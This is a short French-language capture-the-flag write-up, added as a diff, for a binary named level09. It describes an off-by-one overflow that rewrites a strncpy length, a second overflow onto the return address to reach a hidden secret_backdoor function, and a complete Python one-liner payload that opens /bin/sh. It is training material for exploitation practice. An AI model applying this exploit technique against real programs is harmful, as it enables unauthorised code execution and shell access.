@@ -1,0 +1,31 @@
+en faisant un info func sur le programme, on voit qu'il y a une fonction secret backdoor, qui n'est jamais call
+
+apres avoir reverse le programme, on remarque que le buffer de l'username fait 40 octets, alors que la boucle
+qui copie l'entree dessus est repetée 41 fois.
+On va donc pouvoir overflow un octet.
+
+Par chance l'octet suivant en memoire et la longueur du message, qui est pris en parametre par strncpy
+
+On va donc changer la longueur du message en utilisant cette technique pour creer un second buffer overflow sur rsp cette fois.
+
+rsp = eip en 64 bit, ce qui fait que le registre prend 8 octet au lieu de 4
+
+en utilisant un pattern generator on trouve que l'eip est de 200.
+
+(gdb) print secret_backdoor
+$2 = {<text variable, no debug info>} 0x55555555488c <secret_backdoor>
+
+on trouve ensuite l'adresse de secret backdoor, pour preparer le payload
+
+Notre payload va ressembler a ca:
+
+X * 40, pour remplir le buffer username,
+\xff, on override la taille par 255
+"\n" pour entrer dans le buffer message
+"X" * 200, pour remplir le buffer jusqu'a rsp,
+\x8c\x48\x55\x55\x55\x55\x00, on met l'adresse de secret_backdoor sur rsp
+"\n" pour entrer dans le buffer de secret_backdoor, 
+"/bin/sh", pour ouvrir le shell
+
+(python -c 'print "A" * 40 + "\xff" + "\n" + "A" * 200 + "\x8c\x48\x55\x55\x55\x55\x00" + "\n" + "/bin/sh"'; cat) | ./level09
+
